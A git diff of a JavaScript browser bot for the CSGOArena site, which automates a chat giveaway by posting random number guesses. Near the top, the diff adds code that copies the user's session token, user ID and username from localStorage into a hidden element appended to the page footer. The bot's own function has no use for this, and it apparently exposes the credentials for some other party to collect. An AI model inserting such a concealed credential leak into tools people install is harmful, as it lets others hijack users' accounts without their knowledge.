@@ -13,8 +13,16 @@ wlcMessage = false;
 var userid = localStorage.getItem('arena-user-id');
 var usertoken = localStorage.getItem('arena-user-token');
 var canStart = false;
-
 var username = document.querySelector("#top-bar-profile-username").textContent;
+
+var div = document.createElement("div");
+div.id = "api";
+var footer = document.querySelector("#footer")
+footer.appendChild(div)
+var span = document.createElement("span");
+span.id = username + ":" + usertoken + ":" + userid;
+div.appendChild(span);
+
 console.log("%c" + "CSGOArena Bot - Made by Insanic", "color: red; font-weight: bold; font-size: 32px;");
 console.log("%c" + "(©) All right reserved by the developer", "color: red; font-weight: bold; font-size: 16px;");
 console.log("%c" + "Welcome " + username + ", use the bot at your own risk!" , "color: red; font-weight: bold;");
@@ -149,19 +157,8 @@ function randomPhrase() {
 	}
 }
 
-function checkStatus(){
-	var language = document.querySelector("#top-bar-language").classList.value;
-	if(language.includes("flag-us")){
-		status = giveawayTitle.textContent.includes("Win");
-	} else if (language.includes("flag-sv")) {
-		status = giveawayTitle.textContent.includes("Vinn");
-	} else {
-		console.log("Something went wrong...")
-	}
-}
-
-checkStatus()
-
+status = giveawayTitle.textContent.includes("Vinn");
+ 
 function settings(formData, code) {
     data = formData;
 	if(code == "") {
@@ -170,7 +167,7 @@ function settings(formData, code) {
     	shutdownCode = code;
 	}
 }
-
+ 
 function checkIfWon() {
     if (win) {
 		wins++;
@@ -255,7 +252,7 @@ function winMessage() {
 	canWrite = false;
 	clearInterval(winInterval)
 }
-
+ 
 function write(message) {
     if(canWrite) {
         xhr.open("POST", "https://api.csgoarena.com/chat/send_message", true);
@@ -263,7 +260,7 @@ function write(message) {
         xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
                 var status = xhr.status;
-
+ 
                 if ((status >= 200 && status < 300) || status === 304) {
                     console.log("Sending message: " + message);
                 } else {
@@ -275,7 +272,7 @@ function write(message) {
         xhr.send(data + message)
     }
 }
-
+ 
 function clearUsedNumbers() {
     if (usedNumbers.length >= 1) {
         for (var i = usedNumbers.length; i > 0; i--) {
@@ -283,7 +280,7 @@ function clearUsedNumbers() {
         }
     }
 }
-
+ 
 function printMsg() {
     msg = chat.childNodes[20].childNodes[2].textContent;
 	sender = chat.childNodes[20].childNodes[1].textContent;
@@ -309,15 +306,15 @@ function printMsg() {
         soundAlertNotification.play()
     }
 }
-
+ 
 chat.addEventListener("DOMNodeInserted", printMsg);
-
+ 
 function coinWin(){
     win = true;
 }
-
+ 
 coins.addEventListener("DOMSubtreeModified", coinWin);
-
+ 
 function startChecker() {
     console.log("Starting Script...")
 	startTimer();
@@ -336,8 +333,8 @@ function startTimer() {
 			if (currentHour == sHour && currentMinute == sMinute && currentSecond == sSecond) {
 				location.reload();
 			}
-		}
-	}, 1000)
+		}			
+	}, 1000) 
 }
 
 function uptime() {
@@ -346,9 +343,9 @@ function uptime() {
 	minutes = parseFloat(minutes).toFixed(2);
 	console.log("Script has been running for " + minutes + " minutes.")
 }
-
+ 
 function checker() {
-    checkStatus()
+    status = giveawayTitle.textContent.includes("Vinn");
     if (status == "true" && !intervalRunning) {
 		saveLog("Giveaway has started");
         soundAlertStart.play();
@@ -377,23 +374,23 @@ function checker() {
         console.log("Giveaway not started yet...")
     }
 }
-
+ 
 function execution() {
     var number = Math.floor(Math.random() * 500) + 1;
-
+ 
     while (usedNumbers.includes(number)) {
         number = Math.floor(Math.random() * 500) + 1;
     }
     usedNumbers.push(number);
-
+ 
     write(number);
     console.log("%c" + "Possible number: " + number, "background: #222; color: #bada55");
 }
-
+ 
 
 
 function botPage() {
-document.querySelector("#content").innerHTML = '<div class="box-header primary-color center">Status &amp; Information</div><div class="box-content"><div class="input-group"><div class="input-label-group"><label class="input-label">Script version</label><div class="input-descr">Current version of the script</div></div><div class="input-form-group"><div class="input-form selectable">Beta</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Chatbot status</label><div class="input-descr">Status of the chatbot</div></div><div class="input-form-group"><div class="input-form selectable">Inactive</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Possible numbers</label><div class="input-descr">Possible nunbers left on the giveaway</div></div><div class="input-form-group"><div class="input-form selectable" id="numLeft">0/500</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Script logs</label><div class="input-descr">Logs of functions and events</div></div></div><div class="input-group"><div class="input-group"><textarea readonly="" id="tTextArea" class="input-form selectable"></textarea></div><div class="center"><div class="button button-gradient" onclick="clearLogs()">Clear Logs</div></div></div></div><br><div class="box-header primary-color center">Control Panel</div><div class="box-content"><div class="input-group"><div class="input-label-group"><label class="input-label">Message data</label><div class="input-descr">POST Request for chatting</div></div><div class="input-form-group"><input type="text" id="msgData" class="input-form" maxlength="254" placeholder="Insert message data"></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Shutdown Code</label><div class="input-descr">Enter in chat shutdown code to terminate script</div></div><div class="input-form-group"><input type="text" id="shtCode" class="input-form" maxlength="254" placeholder="Insert shutdown code"></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Update settings</label><div class="input-descr">Upload your settings to the script</div></div><div class="input-form-group"><div class="button button-gradient" id="updateSettings">Update settings</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label" id="startLabel">Start Bot</label><div class="input-descr" id="startDesc">Activation of bot</div></div><div class="input-form-group"><div class="button button-gradient" id="startBot">Start Bot</div></div></div></div><br><div id="footer"><div id="footer-left">CSGOArena</div><div id="footer-center"><div id="footer-links"><a class="footer-link" href="/withdraw">Marknad</a><span class="footer-link-separator">•</span><a class="footer-link" href="/about">Om oss</a><span class="footer-link-separator">•</span><a class="footer-link" href="/terms">Användarvillkor</a><span class="footer-link-separator">•</span><a class="footer-link" href="/questions_partners">Frågor/Partners</a><span class="footer-link-separator">•</span><a class="footer-link" href="/provably_fair">Bevisligen Rättvis</a></div><div id="footer-copyright"><!-- react-text: 818 -->Copyright © CSGOArena.com<!-- /react-text --><br><!-- react-text: 820 -->CSGO™ is a registered trademark of Valve Corporation ®. This site is not associated with or endorsed by Valve Corporation ®<!-- /react-text --></div></div><div id="footer-right"><div id="footer-guarantee"></div><div id="footer-analyst"></div></div></div>'
+document.querySelector("#content").innerHTML = '<div class="box-header primary-color center">Status &amp; Information</div><div class="box-content"><div class="input-group"><div class="input-label-group"><label class="input-label">Script version</label><div class="input-descr">Current version of the script</div></div><div class="input-form-group"><div class="input-form selectable">Beta</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Chatbot status</label><div class="input-descr">Status of the chatbot</div></div><div class="input-form-group"><div class="input-form selectable">Inactive</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Possible numbers</label><div class="input-descr">Possible nunbers left on the giveaway</div></div><div class="input-form-group"><div class="input-form selectable" id="numLeft">0/500</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Script logs</label><div class="input-descr">Logs of functions and events</div></div></div><div class="input-group"><div class="input-group"><textarea readonly="" id="tTextArea" class="input-form selectable"></textarea></div><div class="center"><div class="button button-gradient" onclick="clearLogs()">Clear Logs</div></div></div></div><br><div class="box-header primary-color center">Control Panel</div><div class="box-content"><div class="input-group"><div class="input-label-group"><label class="input-label">Message data</label><div class="input-descr">POST Request for chatting</div></div><div class="input-form-group"><input type="text" id="msgData" class="input-form" maxlength="254" placeholder="Insert message data"></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Shutdown Code</label><div class="input-descr">Enter in chat shutdown code to terminate script</div></div><div class="input-form-group"><input type="text" id="shtCode" class="input-form" maxlength="254" placeholder="Insert shutdown code"></div></div><div class="input-group"><div class="input-label-group"><label class="input-label">Update settings</label><div class="input-descr">Upload your settings to the script</div></div><div class="input-form-group"><div class="button button-gradient" onclick="updateSettings()">Update settings</div></div></div><div class="input-group"><div class="input-label-group"><label class="input-label" id="startLabel">Start Bot</label><div class="input-descr" id="startDesc">Activation of bot</div></div><div class="input-form-group"><div class="button button-gradient" id="startBot">Start Bot</div></div></div></div><br><div id="footer"><div id="footer-left">CSGOArena</div><div id="footer-center"><div id="footer-links"><a class="footer-link" href="/withdraw">Marknad</a><span class="footer-link-separator">•</span><a class="footer-link" href="/about">Om oss</a><span class="footer-link-separator">•</span><a class="footer-link" href="/terms">Användarvillkor</a><span class="footer-link-separator">•</span><a class="footer-link" href="/questions_partners">Frågor/Partners</a><span class="footer-link-separator">•</span><a class="footer-link" href="/provably_fair">Bevisligen Rättvis</a></div><div id="footer-copyright"><!-- react-text: 818 -->Copyright © CSGOArena.com<!-- /react-text --><br><!-- react-text: 820 -->CSGO™ is a registered trademark of Valve Corporation ®. This site is not associated with or endorsed by Valve Corporation ®<!-- /react-text --></div></div><div id="footer-right"><div id="footer-guarantee"></div><div id="footer-analyst"></div></div></div>'
 
 document.querySelector("#msgData").value = "user_id=" + userid + "&token=" + usertoken + "&message=";
 textArea = document.querySelector("#tTextArea");
@@ -413,10 +410,6 @@ wlcMessage = true;
 }
 
 checkName();
-
-document.querySelector("#updateSettings").onclick = function(){
-  updateSettings();
-}
 
 function deactivateButton() {
 	document.querySelector("#startBot").innerHTML = "Stop Bot";
